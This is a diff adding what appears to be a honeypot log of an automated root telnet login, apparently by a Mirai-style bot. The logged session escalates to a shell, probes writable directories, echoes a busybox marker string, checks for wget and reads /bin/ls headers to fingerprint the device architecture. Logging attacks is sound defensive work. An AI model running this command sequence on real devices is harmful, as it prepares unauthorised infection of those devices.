@@ -1,0 +1,17 @@
+from: 45.229.54.255:62476 user:root password:
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x48\x4c\x53\x52\x53\x51'
+/bin/busybox wget;/bin/busybox echo -ne '\x48\x4c\x53\x52\x53\x51'
+/bin/busybox cat /bin/ls|head -n 1
+/bin/busybox hexdump -e '16/1 "%c"' -n 52 /bin/ls
+/bin/busybox cat /bin/ls|more
+dd bs=52 count=1 if=/bin/ls || cat /bin/ls || while read i; do echo $i; done < /bin/ls || while read i; do echo $i; done < /bin/busybox
+/bin/busybox dd bs=52 count=1 if=/bin/ls || /bin/busybox cat /bin/ls || while read i; do printf $i; done < /bin/ls || while read i; do printf $i; done < /bin/busybox
+[eof]
